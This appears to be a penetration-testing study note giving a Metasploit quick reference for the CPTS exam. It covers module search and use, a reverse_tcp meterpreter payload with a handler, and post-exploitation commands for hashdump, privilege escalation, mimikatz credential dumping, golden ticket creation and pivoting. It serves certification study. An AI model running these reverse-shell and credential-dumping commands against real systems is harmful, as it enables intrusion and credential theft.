# 16 — Metasploit Quick Reference

Allowed in the CPTS exam. Useful for speed, but **know the manual way too** — some exam objectives may require you to explain/prove exploitation manually in the report, and metasploit modules aren't always available for a given CVE.

## Basics

```bash
msfconsole -q
search <service/CVE>
use exploit/path/to/module
show options
set RHOSTS <IP>
set LHOST <YOUR_IP>
set payload windows/x64/meterpreter/reverse_tcp
run
```

## Handler For Custom (non-msf-generated) Shells

```
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST YOUR_IP
set LPORT PORT
run
```

## Useful Meterpreter Commands

```
sysinfo
getuid
getsystem                  # auto privesc attempts (Windows)
hashdump                   # local SAM dump
migrate <PID>              # move to stabler process
background
sessions -l
shell                      # drop to native shell
upload/download
run post/multi/recon/local_exploit_suggester
run post/windows/gather/hashdump
load kiwi                  # mimikatz integration
  creds_all
  golden_ticket_create
```

## Database Usage (organize a big engagement)

```bash
msfconsole
db_status
hosts
services
db_nmap -sV <IP>
```

## AutoRoute + Socks Proxy (see `15-pivoting-tunneling.md`)

## When NOT To Rely On Metasploit In CPTS

- Report requires you to explain exact exploitation steps/methodology — manual commands (curl, python exploit scripts) are easier to document and screenshot clearly than msf module internals.
- Many custom/CTF-style vulnerable services in HTB boxes don't have msf modules — you'll need manual exploitation skills regardless (searchsploit, GitHub PoCs, writing your own).
- Over-reliance without understanding = failing to explain "how" in the report, which costs points.

## Quick Reference

| Task | Command |
|---|---|
| Find exploit module | `search <keyword/CVE>` |
| Check target compatibility before firing | `check` (after `use` + `set RHOSTS`) |
| List all active sessions | `sessions -l` |
| Route through a session for internal pivoting | `run autoroute -s <subnet>/24` |

Next: `17-tools-cheatsheet.md`
